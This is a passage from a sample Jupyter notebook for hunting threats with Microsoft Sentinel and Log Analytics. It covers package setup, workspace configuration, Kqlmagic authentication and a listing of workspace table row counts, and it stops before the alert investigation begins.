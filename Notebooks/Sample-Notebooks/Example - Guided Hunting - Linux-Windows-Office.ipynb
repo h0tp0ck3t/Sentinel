{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "# Title: Sample Investigation - Linux, Windows, Network, Office\n",
    "### Demo version\n",
    "**Notebook Version:** 1.0<br>\n",
    "**Python Version:** Python 3.6 (including Python 3.6 - AzureML)<br>\n",
    "**Required Packages**: kqlmagic, msticpy, pandas, numpy, matplotlib, networkx, ipywidgets, ipython, scikit_learn, dnspython, ipwhois, folium, maxminddb_geolite2<br>\n",
    "**Platforms Supported**:\n",
    "- Azure Notebooks Free Compute\n",
    "- Azure Notebooks DSVM\n",
    "- OS Independent\n",
    "\n",
    "**Data Sources Required**:\n",
    "- Log Analytics - SecurityAlert, SecurityEvent (EventIDs 4688 and 4624/25), AuditLog_CL (Linux Auditd), OfficeActivity, AzureNetworkAnalytics_CL, Heartbeat\n",
    "- (Optional) - VirusTotal (with API key)\n",
    "\n",
    "## Description:\n",
    "This is an example notebook demonstrating techniques to trace the path of an attacker in an organization. Most of the steps use relatively simple _Log Analytics_ queries but it also includes a few advanced procedures such as:\n",
    "- Unpacking and decoding Linux Audit logs\n",
    "- Clustering\n",
    "\n",
    "From an initial alert (or suspect IP address) examine activity on a Linux host, a Windows and Office subscription.\n",
    "Discover malicious activity related to the ip address in each of these. \n",
    "\n",
    "The notebook is intended to illustrate the kinds of steps and data query and analysis that you might do in a real hunt or investigation.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id='toc'></a>\n",
    "## Table of Contents\n",
    "- [Setup and Authenticate](#setup)\n",
    "\n",
    "- [Get Alerts List](#getalertslist)\n",
    "- [Choose an Alert to investigate](#enteralertid)\n",
    "  - [Extract Properties and entities from alert](#extractalertproperties)\n",
    "  - [Basic IP Checks](#basic_ip_checks)\n",
    "    - [Check the IP Address for known C2 addresses](#check_ip_ti)\n",
    "- [See What's going on on the Affected Host - Linux](#alerthost)\n",
    "  - [Event Types collected](#linux_event_types)\n",
    "  - [Failure Events](#linux_failure_events)\n",
    "  - [Extract IPs from all Events](#linux_extract_ips)\n",
    "  - [Get Logins with IP Address Recorded](#linux_login_ips)\n",
    "  - [What's happening in these sessions?](#linux_login_sessions)\n",
    "  - [Find Distinctive Process Patterns - Clustering](#linux_proc_cluster)\n",
    "- [Alert Host Network Data](#alert_host_net)\n",
    "  - [Check Communications with Other Hosts](#comms_to_other_hosts)\n",
    "  - [GeoLocation Mapping](#geomap_lx_ips)\n",
    "  - [Have any other hosts been communicating with this address(es)?](#other_hosts_to_ips)\n",
    "- [Other Hosts Communicating with IP](#other_host_investigate)\n",
    "  - [Check Host Logons](#host_logons)\n",
    "  - [Examine a Logon Session](#examine_win_logon_sess)\n",
    "  - [Unusual Processes on Host - Clustering](#process_clustering)\n",
    "  - [Processes for Selected LogonId](#process_session)\n",
    "  - [Other Events on the Host](#other_win_events)\n",
    "- [Office 365 Activity](#o365)\n",
    "- [Summary](#summary)\n",
    "- [Appendices](#appendices)\n",
    "  - [Saving data to Excel](#appendices)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id='setup'></a>[Contents](#toc)\n",
    "# Setup\n",
    "\n",
    "Make sure that you have installed packages specified in the setup (uncomment the lines to execute)\n",
    "\n",
    "## Install Packages\n",
    "The first time this cell runs for a new Azure Notebooks project or local Python environment it will take several minutes to download and install the packages. In subsequent runs it should run quickly and confirm that package dependencies are already installed. Unless you want to upgrade the packages you can feel free to skip execution of the next cell.\n",
    "\n",
    "If you see any import failures (```ImportError```) in the notebook, please re-run this cell and answer 'y', then re-run the cell where the failure occurred.\n",
    "\n",
    "Note you may see some warnings about package incompatibility with certain packages. This does not affect the functionality of this notebook but you may need to upgrade the packages producing the warnings to a more recent version."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "    <script>\n",
       "    function code_toggle() {\n",
       "        if ($('div.cell.code_cell.rendered.selected div.input').css('display')!='none'){\n",
       "            $('div.cell.code_cell.rendered.selected div.input').hide();\n",
       "        } else {\n",
       "            $('div.cell.code_cell.rendered.selected div.input').show();\n",
       "        }\n",
       "    }\n",
       "    </script>\n",
       "\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "If you answer \"n\" this cell will exit with an error in order to avoid the pip install calls,\n",
      "This error can safely be ignored.\n"
     ]
    }
   ],
   "source": [
    "import sys\n",
    "import warnings\n",
    "\n",
    "warnings.filterwarnings(\"ignore\",category=DeprecationWarning)\n",
    "\n",
    "MIN_REQ_PYTHON = (3,6)\n",
    "if sys.version_info < MIN_REQ_PYTHON:\n",
    "    print('Check the Kernel->Change Kernel menu and ensure that Python 3.6')\n",
    "    print('or later is selected as the active kernel.')\n",
    "    sys.exit(\"Python %s.%s or later is required.\\n\" % MIN_REQ_PYTHON)\n",
    "    \n",
    "# Package Installs - try to avoid if they are already installed\n",
    "try:\n",
    "    import msticpy.sectools as sectools\n",
    "    import Kqlmagic\n",
    "    from dns import reversename, resolver\n",
    "    from ipwhois import IPWhois\n",
    "    import folium\n",
    "    \n",
    "    print('If you answer \"n\" this cell will exit with an error in order to avoid the pip install calls,')\n",
    "    print('This error can safely be ignored.')\n",
    "    resp = input('msticpy and Kqlmagic packages are already loaded. Do you want to re-install? (y/n)')\n",
    "    if resp.strip().lower() != 'y':\n",
    "        sys.exit('pip install aborted - you may skip this error and continue.')\n",
    "except ImportError:\n",
    "    pass\n",
    "\n",
    "print('\\nPlease wait. Installing required packages. This may take a few minutes...')\n",
    "!pip install git+https://github.com/microsoft/msticpy --upgrade --user\n",
    "!pip install Kqlmagic --no-cache-dir --upgrade --user\n",
    "\n",
    "# Additional packages used in this notebook.\n",
    "!pip install dnspython --upgrade \n",
    "!pip install ipwhois --upgrade \n",
    "!pip install folium --upgrade  \n",
    "\n",
    "# Uncomment to refresh the maxminddb database\n",
    "# !pip install maxminddb-geolite2 --upgrade \n",
    "print('To ensure that the latest versions of the installed libraries '\n",
    "      'are used, please restart the current kernel and run '\n",
    "      'the notebook again skipping this cell.')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "    <script>\n",
       "    function code_toggle() {\n",
       "        if ($('div.cell.code_cell.rendered.selected div.input').css('display')!='none'){\n",
       "            $('div.cell.code_cell.rendered.selected div.input').hide();\n",
       "        } else {\n",
       "            $('div.cell.code_cell.rendered.selected div.input').show();\n",
       "        }\n",
       "    }\n",
       "    </script>\n",
       "\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "This product includes GeoLite2 data created by MaxMind, available from\n",
       "<a href=\"https://www.maxmind.com\">https://www.maxmind.com</a>.\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "This library uses services provided by ipstack.\n",
       "<a href=\"https://ipstack.com\">https://ipstack.com</a>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "    <script>\n",
       "    function code_toggle() {\n",
       "        if ($('div.cell.code_cell.rendered.selected div.input').css('display')!='none'){\n",
       "            $('div.cell.code_cell.rendered.selected div.input').hide();\n",
       "        } else {\n",
       "            $('div.cell.code_cell.rendered.selected div.input').show();\n",
       "        }\n",
       "    }\n",
       "    </script>\n",
       "\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Imports\n",
    "import sys\n",
    "import warnings\n",
    "\n",
    "MIN_REQ_PYTHON = (3,6)\n",
    "if sys.version_info < MIN_REQ_PYTHON:\n",
    "    print('Check the Kernel->Change Kernel menu and ensure that Python 3.6')\n",
    "    print('or later is selected as the active kernel.')\n",
    "    sys.exit(\"Python %s.%s or later is required.\\n\" % MIN_REQ_PYTHON)\n",
    "\n",
    "import numpy as np\n",
    "from IPython import get_ipython\n",
    "from IPython.display import display, HTML, Markdown\n",
    "import ipywidgets as widgets\n",
    "from ipywidgets import interactive\n",
    "\n",
    "import matplotlib.pyplot as plt\n",
    "import seaborn as sns\n",
    "sns.set()\n",
    "import networkx as nx\n",
    "\n",
    "import pandas as pd\n",
    "pd.set_option('display.max_rows', 100)\n",
    "pd.set_option('display.max_columns', 50)\n",
    "pd.set_option('display.max_colwidth', 100)\n",
    "\n",
    "import msticpy.sectools as sectools\n",
    "import msticpy.nbtools as mas\n",
    "import msticpy.nbtools.kql as qry\n",
    "import msticpy.nbtools.nbdisplay as nbdisp\n",
    "from msticpy.sectools.geoip import GeoLiteLookup\n",
    "\n",
    "import platform\n",
    "from datetime import datetime, timedelta\n",
    "from dns import reversename, resolver\n",
    "from ipwhois import IPWhois\n",
    "\n",
    "# Some of our dependencies (networkx) still use deprecated Matplotlib\n",
    "# APIs - we can't do anything about it so suppress them from view\n",
    "from matplotlib import MatplotlibDeprecationWarning\n",
    "warnings.simplefilter(\"ignore\", category=MatplotlibDeprecationWarning)\n",
    "\n",
    "WIDGET_DEFAULTS = {'layout': widgets.Layout(width='95%'),\n",
    "                   'style': {'description_width': 'initial'}}\n",
    "display(HTML(mas.util._TOGGLE_CODE_PREPARE_STR))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Copy Last Query to Clipboard\n",
    "This section adds an IPython magic command 'la'. The magic is used as follows:\n",
    "\n",
    "```%la [pythonvar|string]```\n",
    "\n",
    "If used with no arguments it will copy the last KQL query to clipboard and display a link to take you to the Sentinel/Log Analytics portal. If the argument is a variable the value of the variable is copied, otherwise the string is copied.\n",
    "\n",
    "When using the **%%la** cell magic form the entire cell is copied to the clipboard.\n",
    "\n",
    "The URL uses the current config settings for workspace and subscription.\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {
    "scrolled": false
   },
   "outputs": [],
   "source": [
    "from IPython.core.magic import (register_line_magic, register_cell_magic,\n",
    "                                register_line_cell_magic)\n",
    "from collections import OrderedDict\n",
    "\n",
    "def copy_to_clipboard(copy_text):\n",
    "    pd.DataFrame([copy_text]).to_clipboard(index=False,header=False)\n",
    "\n",
    "\n",
    "LA_URL=('https://ms.portal.azure.com/'\n",
    "        '?feature.showassettypes=Microsoft_Azure_Security_Insights_SecurityInsightsDashboard'\n",
    "        '#blade/Microsoft_Azure_Security_Insights/MainMenuBlade/7'\n",
    "        '/subscriptionId/{sub_id}'\n",
    "        '/resourceGroup/{res_group}'\n",
    "        '/workspaceName/{ws_name}')\n",
    "\n",
    "LA_URL_BARE=('https://ms.portal.azure.com/'\n",
    "             '?feature.showassettypes=Microsoft_Azure_Security_Insights_SecurityInsightsDashboard'\n",
    "             '#blade/Microsoft_Azure_Security_Insights/MainMenuBlade/')\n",
    "@register_line_cell_magic\n",
    "def la(line, cell=None):\n",
    "    KQL_MAGIC_RESULT = '_kql_raw_result_'\n",
    "    \n",
    "    \n",
    "    #import pdb; pdb.set_trace()\n",
    "    if not cell and not line or line.strip() == KQL_MAGIC_RESULT:\n",
    "        if KQL_MAGIC_RESULT in globals():\n",
    "            copy_to_clipboard(globals()[KQL_MAGIC_RESULT].query)\n",
    "            print('Last kql query copied to clipboard.')\n",
    "    elif line and cell is None:\n",
    "        if line in globals():\n",
    "            copy_to_clipboard(globals()[line])\n",
    "            print(f'Value of {line} copied to clipboard.')\n",
    "        elif line in locals():\n",
    "            copy_to_clipboard(locals()[line])\n",
    "            print(f'Value of {line} copied to clipboard.')\n",
    "        else:\n",
    "            copy_to_clipboard(line)\n",
    "            print(f'Copied to clipboard.')\n",
    "    else:\n",
    "        copy_to_clipboard(cell)\n",
    "        print(f'Copied to clipboard.')\n",
    "    \n",
    "    try:\n",
    "        ws_config = WorkspaceConfig(ws_config_file)\n",
    "        url = LA_URL.format(sub_id=ws_config['subscription_id'],\n",
    "                        res_group=ws_config['resource_group'], \n",
    "                        ws_name=ws_config['workspace_name'])\n",
    "    except:\n",
    "        url = LA_URL_BARE\n",
    "    return HTML(f'<a target=\"_new\" href=\"{url}\">Open Log Analytics</a>')\n",
    "del la\n",
    "\n",
    "# Create an observation collector list\n",
    "from collections import namedtuple\n",
    "Observation = namedtuple('Observation', ['caption', 'description', 'item', 'link'])\n",
    "observation_list = OrderedDict()\n",
    "def display_observation(observation):\n",
    "    display(Markdown(f'### {observation.caption}'))\n",
    "    display(Markdown(observation.description))\n",
    "    display(Markdown(f'[Go to details](#{observation.link})'))\n",
    "    display(observation.item)\n",
    "\n",
    "def add_observation(observation):\n",
    "    observation_list[observation.caption] = observation\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "tags": [
     "remove"
    ]
   },
   "source": [
    "### Get WorkspaceId\n",
    "To find your Workspace Id go to [Log Analytics](https://ms.portal.azure.com/#blade/HubsExtension/Resources/resourceType/Microsoft.OperationalInsights%2Fworkspaces). Look at the workspace properties to find the ID."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {
    "scrolled": true,
    "tags": [
     "todo"
    ]
   },
   "outputs": [
    {
     "data": {
      "text/markdown": [
       "Read Workspace configuration from local config.json for workspace **ASIHuntOMSWorkspaceV4**"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/markdown": [
       "**TENANT_ID**: 72f988bf-86f1-41af-91ab-2d7cd011db47"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/markdown": [
       "**SUBSCRIPTION_ID**: 40dcc8bf-0478-4f3b-b275-ed0a94f2c013"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/markdown": [
       "**RESOURCE_GROUP**: ASIHuntOMSWorkspaceRG"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/markdown": [
       "**WORKSPACE_ID**: 52b1ab41-869e-4138-9e40-2a4457f09bf0"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/markdown": [
       "**WORKSPACE_NAME**: ASIHuntOMSWorkspaceV4"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "import os\n",
    "from msticpy.nbtools.wsconfig import WorkspaceConfig\n",
    "ws_config_file = 'config.json'\n",
    "\n",
    "WORKSPACE_ID = None\n",
    "TENANT_ID = None\n",
    "try:\n",
    "    ws_config = WorkspaceConfig(ws_config_file)\n",
    "    display(Markdown(f'Read Workspace configuration from local config.json for workspace **{ws_config[\"workspace_name\"]}**'))\n",
    "    for cf_item in ['tenant_id', 'subscription_id', 'resource_group', 'workspace_id', 'workspace_name']:\n",
    "        display(Markdown(f'**{cf_item.upper()}**: {ws_config[cf_item]}'))\n",
    "                     \n",
    "    if ('cookiecutter' not in ws_config['workspace_id'] or\n",
    "            'cookiecutter' not in ws_config['tenant_id']):\n",
    "        WORKSPACE_ID = ws_config['workspace_id']\n",
    "        TENANT_ID = ws_config['tenant_id']\n",
    "except:\n",
    "    pass\n",
    "\n",
    "if not WORKSPACE_ID or not TENANT_ID:\n",
    "    display(Markdown('**Workspace configuration not found.**\\n\\n'\n",
    "                     'Please go to your Log Analytics workspace, copy the workspace ID'\n",
    "                     ' and/or tenant Id and paste here.<br> '\n",
    "                     'Or read the workspace_id from the config.json in your Azure Notebooks project.'))\n",
    "    ws_config = None\n",
    "    ws_id = mas.GetEnvironmentKey(env_var='WORKSPACE_ID',\n",
    "                              prompt='Please enter your Log Analytics Workspace Id:', auto_display=True)\n",
    "    ten_id = mas.GetEnvironmentKey(env_var='TENANT_ID',\n",
    "                              prompt='Please enter your Log Analytics Tenant Id:', auto_display=True) "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Authenticate to Log Analytics\n",
    "If you are using user/device authentication, run the following cell. \n",
    "- Click the 'Copy code to clipboard and authenticate' button.\n",
    "- This will pop up an Azure Active Directory authentication dialog (in a new tab or browser window). The device code will have been copied to the clipboard. \n",
    "- Select the text box and paste (Ctrl-V/Cmd-V) the copied value. \n",
    "- You should then be redirected to a user authentication page where you should authenticate with a user account that has permission to query your Log Analytics workspace.\n",
    "\n",
    "Use the following syntax if you are authenticating using an Azure Active Directory AppId and Secret:\n",
    "```\n",
    "%kql loganalytics://tenant(aad_tenant).workspace(WORKSPACE_ID).clientid(client_id).clientsecret(client_secret)\n",
    "```\n",
    "instead of\n",
    "```\n",
    "%kql loganalytics://code().workspace(WORKSPACE_ID)\n",
    "```\n",
    "\n",
    "Note: you may occasionally see a JavaScript error displayed at the end of the authentication - you can safely ignore this.<br>\n",
    "On successful authentication you should see a ```popup schema``` button."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {
    "tags": [
     "todo"
    ]
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<!DOCTYPE html>\n",
       "                    <html><body><script>\n",
       "\n",
       "                        // close authentication window\n",
       "                        if (kql_MagicUserCodeAuthWindow && kql_MagicUserCodeAuthWindow.opener != null && !kql_MagicUserCodeAuthWindow.closed) {\n",
       "                            kql_MagicUserCodeAuthWindow.close()\n",
       "                        }\n",
       "                        // TODO: make sure, you clear the right cell. BTW, not sure it is a must to do any clearing\n",
       "\n",
       "                        // clear output cell\n",
       "                        Jupyter.notebook.clear_output(Jupyter.notebook.get_selected_index())\n",
       "\n",
       "                        // TODO: if in run all mode, move to last cell, otherwise move to next cell\n",
       "                        // move to next cell\n",
       "\n",
       "                    </script></body></html>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<!DOCTYPE html>\n",
       "            <html><body>\n",
       "\n",
       "            <button onclick=\"this.style.visibility='visible';kql_MagicLaunchWindowFunction('Kqlmagic_temp_files/_52b1ab41-869e-4138-9e40-2a4457f09bf0_at_loganalytics_schema.html','fullscreen=no,directories=no,location=no,menubar=no,resizable=yes,scrollbars=yes,status=no,titlebar=no,toolbar=no,','_52b1ab41_869e_4138_9e40_2a4457f09bf0_at_loganalytics_schema','')\">popup schema 52b1ab41-869e-4138-9e40-2a4457f09bf0@loganalytics</button>\n",
       "\n",
       "            <script>\n",
       "\n",
       "            function kql_MagicLaunchWindowFunction(file_path, window_params, window_name, notebooks_host) {\n",
       "                var url;\n",
       "                if (file_path.startsWith('http')) {\n",
       "                    url = file_path;\n",
       "                } else {\n",
       "                    var base_url = '';\n",
       "\n",
       "                    // check if azure notebook\n",
       "                    var azure_host = (notebooks_host == null || notebooks_host.length == 0) ? 'https://notebooks.azure.com' : notebooks_host;\n",
       "                    var start = azure_host.search('//');\n",
       "                    var azure_host_suffix = '.' + azure_host.substring(start+2);\n",
       "\n",
       "                    var loc = String(window.location);\n",
       "                    var end = loc.search(azure_host_suffix);\n",
       "                    start = loc.search('//');\n",
       "                    if (start > 0 && end > 0) {\n",
       "                        var parts = loc.substring(start+2, end).split('-');\n",
       "                        if (parts.length == 2) {\n",
       "                            var library = parts[0];\n",
       "                            var user = parts[1];\n",
       "                            base_url = azure_host + '/api/user/' +user+ '/library/' +library+ '/html/';\n",
       "                        }\n",
       "                    }\n",
       "\n",
       "                    // check if local jupyter lab\n",
       "                    if (base_url.length == 0) {\n",
       "                        var configDataScipt  = document.getElementById('jupyter-config-data');\n",
       "                        if (configDataScipt != null) {\n",
       "                            var jupyterConfigData = JSON.parse(configDataScipt.textContent);\n",
       "                            if (jupyterConfigData['appName'] == 'JupyterLab' && jupyterConfigData['serverRoot'] != null &&  jupyterConfigData['treeUrl'] != null) {\n",
       "                                var basePath = 'e:\\src\\Orion\\Notebooks' + '/';\n",
       "                                if (basePath.startsWith(jupyterConfigData['serverRoot'])) {\n",
       "                                    base_url = '/files/' + basePath.substring(jupyterConfigData['serverRoot'].length+1);\n",
       "                                }\n",
       "                            } \n",
       "                        }\n",
       "                    }\n",
       "\n",
       "                    // assume local jupyter notebook\n",
       "                    if (base_url.length == 0) {\n",
       "\n",
       "                        var parts = loc.split('/');\n",
       "                        parts.pop();\n",
       "                        base_url = parts.join('/') + '/';\n",
       "                    }\n",
       "                    url = base_url + file_path;\n",
       "                }\n",
       "\n",
       "                window.focus();\n",
       "                var w = screen.width / 2;\n",
       "                var h = screen.height / 2;\n",
       "                params = 'width='+w+',height='+h;\n",
       "                kql_Magic__52b1ab41_869e_4138_9e40_2a4457f09bf0_at_loganalytics_schema = window.open(url, window_name, window_params + params);\n",
       "            }\n",
       "            </script>\n",
       "\n",
       "            </body></html>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "if not WORKSPACE_ID or not TENANT_ID:\n",
    "    try:\n",
    "        WORKSPACE_ID = ws_id.value\n",
    "        TENANT_ID = ten_id.value\n",
    "    except NameError:\n",
    "        raise ValueError('No workspace or Tenant Id.')\n",
    "\n",
    "mas.kql.load_kql_magic()\n",
    "%kql loganalytics://code().tenant(TENANT_ID).workspace(WORKSPACE_ID)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/javascript": [
       "try {IPython.notebook.kernel.reconnect();} catch(err) {;}"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/markdown": [
       "Current data in workspace"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>0</th>\n",
       "      <th>1</th>\n",
       "      <th>2</th>\n",
       "      <th>3</th>\n",
       "      <th>4</th>\n",
       "      <th>5</th>\n",
       "      <th>6</th>\n",
       "      <th>7</th>\n",
       "      <th>8</th>\n",
       "      <th>9</th>\n",
       "      <th>10</th>\n",
       "      <th>11</th>\n",
       "      <th>12</th>\n",
       "      <th>13</th>\n",
       "      <th>14</th>\n",
       "      <th>15</th>\n",
       "      <th>16</th>\n",
       "      <th>17</th>\n",
       "      <th>18</th>\n",
       "      <th>19</th>\n",
       "      <th>20</th>\n",
       "      <th>21</th>\n",
       "      <th>22</th>\n",
       "      <th>23</th>\n",
       "      <th>24</th>\n",
       "      <th>25</th>\n",
       "      <th>26</th>\n",
       "      <th>27</th>\n",
       "      <th>28</th>\n",
       "      <th>29</th>\n",
       "      <th>30</th>\n",
       "      <th>31</th>\n",
       "      <th>32</th>\n",
       "      <th>33</th>\n",
       "      <th>34</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>Table</th>\n",
       "      <td>ConfigurationData</td>\n",
       "      <td>SecurityBaselineSummary</td>\n",
       "      <td>Syslog</td>\n",
       "      <td>SecurityDetection</td>\n",
       "      <td>Operation</td>\n",
       "      <td>ProtectionStatus</td>\n",
       "      <td>ConfigurationChange</td>\n",
       "      <td>AzureMetrics</td>\n",
       "      <td>HuntingBookmark</td>\n",
       "      <td>AzureActivity</td>\n",
       "      <td>OfficeActivity</td>\n",
       "      <td>Update</td>\n",
       "      <td>Heartbeat</td>\n",
       "      <td>ProcessCreationSqlV2_CL</td>\n",
       "      <td>SecurityBaseline</td>\n",
       "      <td>SSHAlertDataV1_CL</td>\n",
       "      <td>AwsEventsSample_CL</td>\n",
       "      <td>Usage</td>\n",
       "      <td>Syslog_CL</td>\n",
       "      <td>SqlLogArtifacts_CL</td>\n",
       "      <td>UpdateSummary</td>\n",
       "      <td>ThreatIntelSample_CL</td>\n",
       "      <td>AzureDiagnostics</td>\n",
       "      <td>SecurityEvent</td>\n",
       "      <td>SecurityAlert</td>\n",
       "      <td>AzureNetworkAnalytics_CL</td>\n",
       "      <td>SSHAlertDataV2_CL</td>\n",
       "      <td>ProcessCreationSqlV1_CL</td>\n",
       "      <td>ScratchData_CL</td>\n",
       "      <td>BYOThreatIntelv1_CL</td>\n",
       "      <td>AuditLog_CL</td>\n",
       "      <td>SSHAlertDataV2cls_CL</td>\n",
       "      <td>MruArtifacts_CL</td>\n",
       "      <td>AutorunsArtifacts_CL</td>\n",
       "      <td>AmcacheArtifacts_CL</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>RowCount</th>\n",
       "      <td>241901</td>\n",
       "      <td>343</td>\n",
       "      <td>1333317</td>\n",
       "      <td>6514</td>\n",
       "      <td>7164</td>\n",
       "      <td>9613</td>\n",
       "      <td>21345</td>\n",
       "      <td>7553368</td>\n",
       "      <td>18</td>\n",
       "      <td>116630</td>\n",
       "      <td>1994</td>\n",
       "      <td>218050</td>\n",
       "      <td>692921</td>\n",
       "      <td>75323</td>\n",
       "      <td>52484</td>\n",
       "      <td>1</td>\n",
       "      <td>510</td>\n",
       "      <td>37697</td>\n",
       "      <td>3451</td>\n",
       "      <td>141584</td>\n",
       "      <td>1071</td>\n",
       "      <td>27</td>\n",
       "      <td>174370</td>\n",
       "      <td>1399465</td>\n",
       "      <td>6726</td>\n",
       "      <td>9954831</td>\n",
       "      <td>15</td>\n",
       "      <td>75323</td>\n",
       "      <td>70792</td>\n",
       "      <td>6</td>\n",
       "      <td>53356839</td>\n",
       "      <td>1</td>\n",
       "      <td>6714992</td>\n",
       "      <td>76846402</td>\n",
       "      <td>362040170</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                         0                        1        2   \\\n",
       "Table     ConfigurationData  SecurityBaselineSummary   Syslog   \n",
       "RowCount             241901                      343  1333317   \n",
       "\n",
       "                         3          4                 5                    6   \\\n",
       "Table     SecurityDetection  Operation  ProtectionStatus  ConfigurationChange   \n",
       "RowCount               6514       7164              9613                21345   \n",
       "\n",
       "                    7                8              9               10  \\\n",
       "Table     AzureMetrics  HuntingBookmark  AzureActivity  OfficeActivity   \n",
       "RowCount       7553368               18         116630            1994   \n",
       "\n",
       "              11         12                       13                14  \\\n",
       "Table     Update  Heartbeat  ProcessCreationSqlV2_CL  SecurityBaseline   \n",
       "RowCount  218050     692921                    75323             52484   \n",
       "\n",
       "                         15                  16     17         18  \\\n",
       "Table     SSHAlertDataV1_CL  AwsEventsSample_CL  Usage  Syslog_CL   \n",
       "RowCount                  1                 510  37697       3451   \n",
       "\n",
       "                          19             20                    21  \\\n",
       "Table     SqlLogArtifacts_CL  UpdateSummary  ThreatIntelSample_CL   \n",
       "RowCount              141584           1071                    27   \n",
       "\n",
       "                        22             23             24  \\\n",
       "Table     AzureDiagnostics  SecurityEvent  SecurityAlert   \n",
       "RowCount            174370        1399465           6726   \n",
       "\n",
       "                                25                 26  \\\n",
       "Table     AzureNetworkAnalytics_CL  SSHAlertDataV2_CL   \n",
       "RowCount                   9954831                 15   \n",
       "\n",
       "                               27              28                   29  \\\n",
       "Table     ProcessCreationSqlV1_CL  ScratchData_CL  BYOThreatIntelv1_CL   \n",
       "RowCount                    75323           70792                    6   \n",
       "\n",
       "                   30                    31               32  \\\n",
       "Table     AuditLog_CL  SSHAlertDataV2cls_CL  MruArtifacts_CL   \n",
       "RowCount     53356839                     1          6714992   \n",
       "\n",
       "                            33                   34  \n",
       "Table     AutorunsArtifacts_CL  AmcacheArtifacts_CL  \n",
       "RowCount              76846402            362040170  "
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "%kql search * | summarize RowCount=count() by Type | project-rename Table=Type\n",
    "la_table_set = _kql_raw_result_.to_dataframe()\n",
    "table_index = la_table_set.set_index('Table')['RowCount'].to_dict()\n",
    "display(Markdown('Current data in workspace'))\n",
    "display(la_table_set.T)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id='enteralertid'></a>[Contents](#toc)\n",
    "# Choose Alert to Investigate\n",
    "Pick an alert from a list of retrieved alerts.\n",
    "\n",
    "This section extracts the alert information and entities into a SecurityAlert object allowing us to query the properties more reliably. \n",
    "\n",
    "In particular, we use the alert to automatically provide parameters for queries and UI elements.\n",
    "Subsequent queries will use properties like the host name and derived properties such as the OS family (Linux or Windows) to adapt the query. Query time selectors like the one above will also default to an origin time that matches the alert selected.\n",
    "\n",
    "The alert view below shows all of the main properties of the alert plus the extended property dictionary (if any) and JSON representations of the Entity."
   ]
  },
